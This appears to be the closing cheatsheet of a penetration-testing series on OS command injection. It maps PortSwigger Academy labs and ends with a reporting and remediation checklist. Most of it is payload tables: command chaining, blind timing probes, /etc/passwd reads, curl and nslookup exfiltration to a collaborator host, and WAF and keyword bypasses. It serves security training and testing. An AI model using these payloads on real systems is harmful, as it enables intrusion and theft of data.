# OS Command Injection — Cheatsheet and Complete Lab Mapping

## 1. Quick-Reference Payload Table

### Linux

| Goal | Payload | Notes |
|---|---|---|
| Unconditional chain | `; whoami` | Always runs second command, regardless of first's exit status. |
| Pipe-based chain | `\| id` | Output of first command piped (often irrelevant) to second. |
| Run only if first succeeds | `&& whoami` | Conditional execution — useful for boolean tests. |
| Run only if first fails | `\|\| whoami` | Useful when original command is expected to fail. |
| Command substitution (legacy) | `` `whoami` `` | Executes inline, substitutes output as text. |
| Command substitution (modern) | `$(whoami)` | Preferred for nesting; equivalent to backticks. |
| Time-based blind probe | `; sleep 10` | No side effects besides delay — cleanest blind signal. |
| Time-based fallback | `; ping -c 10 127.0.0.1` | Use if `sleep` filtered/missing. |
| Conditional time-based | `; [ -r /etc/shadow ] && sleep 10` | Boolean fact extraction without OOB infra. |
| File-write confirmation | `; echo test123 > /var/www/html/proof.txt` | Requires known/guessed web root + write perms. |
| OOB DNS confirmation | `; nslookup x.collaborator-id` | DNS often allowed even when HTTP egress is blocked. |
| OOB DNS data exfil | `` ; nslookup $(whoami).x.collaborator-id `` | Subdomain label carries exfiltrated data; 63-char/label limit. |
| OOB HTTP confirmation | `; curl http://x.collaborator-id/` | Richer logging (headers) than DNS-only. |
| OOB HTTP data exfil | `; curl http://x.collaborator-id/$(whoami)` | No DNS-label length constraint. |
| Space bypass | `;cat${IFS}/etc/passwd` | Shell expands `${IFS}` to space before parsing. |
| Space bypass (tab) | `;cat%09/etc/passwd` | URL-encoded tab as alternative word separator. |
| Keyword bypass (quote split) | `;who'am'i` | Adjacent empty quotes don't break word boundary. |
| Keyword bypass (var concat) | `;a=wh;b=oami;$a$b` | Avoids literal sensitive substring in payload. |
| Keyword bypass (encoded) | `` ;echo d2hvYW1p \| base64 -d \| sh `` | Defeats literal-string keyword filters. |

### Windows (cmd.exe)

| Goal | Payload | Notes |
|---|---|---|
| Unconditional chain | `& whoami` | Windows equivalent of Linux `;`. |
| Conditional (success) | `&& whoami` | Same semantics as Linux. |
| Conditional (failure) | `\|\| whoami` | Same semantics as Linux. |
| Pipe | `\| dir` | Same piping concept as Linux. |
| Time-based blind | `& timeout /t 10` | May fail in non-interactive contexts — see fallback. |
| Time-based fallback | `& ping -n 10 127.0.0.1` | `-n` not `-c` on Windows ping. |
| OOB DNS | `& nslookup x.collaborator-id` | Ships natively with Windows. |
| OOB HTTP (via PowerShell) | `& powershell -Command "Invoke-WebRequest -Uri http://x.collaborator-id/$(whoami)"` | `cmd.exe` has no native HTTP client. |
| Filter bypass (caret escape) | `& w^hoami` | `^` consumed by cmd.exe parser, keyword filter sees mismatch. |
| **No equivalent** | backticks / `$()` | `cmd.exe` has no command-substitution syntax at all. |

### PowerShell-Specific Notes

- `;` = statement separator (same symbol as Linux, same unconditional effect).
- `$()` = subexpression syntax, functions like Linux `$()`.
- Backtick (`` ` ``) = **escape character only**, NOT substitution — do not reuse Linux backtick payloads here.

## 2. Decision Flow — Which Technique to Try First

1. **Is output reflected anywhere in the response?**
   - Yes → use in-band techniques (`02_InBand_Command_Injection.md`).
   - No → continue.
2. **Is a timing signal feasible (synchronous request/response)?**
   - Yes → use time-based or conditional blind techniques (`03_Blind_Command_Injection.md`).
   - No (fully async backend) → continue.
3. **Can you write to a path later served statically?**
   - Yes → file-write/read detection (`03_Blind_Command_Injection.md` Section 5).
   - No / unknown → continue.
4. **Use OOB (DNS first, then HTTP)** (`04_OutOfBand_Command_Injection.md`).
5. **At every stage, if a payload is blocked**, work through operator substitution, space bypass, and keyword bypass systematically (`05_Filter_WAF_Bypass.md`) before concluding "not vulnerable."
6. **For broad coverage across many candidate parameters**, use commix (`06_Commix_Automation.md`) to triage, then manually confirm anything it flags.

## 3. Complete PortSwigger Academy Lab Progression (OS Command Injection Topic)

Labs are listed in the order they appear on the Academy, which is also the intended difficulty progression:

| # | Lab Name | Technique Required | Covered In |
|---|---|---|---|
| 1 | OS command injection, simple case | In-band, direct output reflected — chain with `;` and run `whoami` | `02_InBand_Command_Injection.md` |
| 2 | Blind OS command injection with time delays | Time-based detection — `; sleep 10` | `03_Blind_Command_Injection.md` §2 |
| 3 | Blind OS command injection with output redirection | Redirect command output to a web-accessible file with `>`, retrieve via direct GET | `03_Blind_Command_Injection.md` §5 |
| 4 | Blind OS command injection with out-of-band interaction | DNS-based OOB confirmation via Burp Collaborator | `04_OutOfBand_Command_Injection.md` §3 |
| 5 | Blind OS command injection with out-of-band data exfiltration | DNS subdomain data smuggling — `` nslookup $(whoami).<collaborator-id> `` | `04_OutOfBand_Command_Injection.md` §3 |

**Progression logic:** Each lab removes one of your previous signals — Lab 1 gives you full output, Lab 2 removes output but keeps a usable timing channel, Lab 3 removes a reliable timing channel but allows file writes, and Labs 4–5 remove all of the above, forcing a fully out-of-band approach. This mirrors exactly how blind/OOB techniques escalate in real engagements when each "easier" signal turns out to be unavailable.

## 4. Cross-Technique Reminders

- Always fingerprint OS/shell (Linux `sh`/`bash` vs Windows `cmd.exe` vs PowerShell) before selecting a payload family — backticks/`$()` simply don't exist in `cmd.exe`, and PowerShell's backtick means something entirely different than Linux's.
- A blocked operator or keyword is evidence of a specific filter rule, not evidence the parameter is safe overall — systematically try alternatives before concluding "not vulnerable."
- Time-based results need repetition against a clean baseline before being trusted; a single slow response is not proof.
- OOB confirmation (a logged DNS/HTTP interaction from the target's own infrastructure) is the strongest, least ambiguous category of evidence available for blind scenarios.

## 5. Master Report-Writing Checklist

For every confirmed finding, include:
- [ ] Exact vulnerable parameter, HTTP method, and full request/response (or Collaborator log) as evidence.
- [ ] Sub-type identified (in-band / blind-time / blind-file / OOB-DNS / OOB-HTTP) and the reasoning that led to that classification.
- [ ] OS and shell context identified, if determinable.
- [ ] Whether a filter/WAF was encountered and bypassed, with both the blocked and successful payloads documented.
- [ ] Whether automation (commix) was used, and the exact command line, alongside manual confirmation steps.
- [ ] Root-cause-focused remediation: eliminate shell invocation (parameterized/direct process execution with no shell, e.g., `subprocess.run([...], shell=False)`) and/or strict input allowlisting — not just "block these specific characters."
- [ ] Realistic impact statement tied to what was actually demonstrated (e.g., "confirmed RCE as `www-data`; full filesystem read access confirmed; no further privilege escalation attempted, out of scope") rather than overstated worst-case claims beyond what was proven.

---
**Previous file:** `06_Commix_Automation.md`
**Series complete.** Return to `README.md` for the full index.
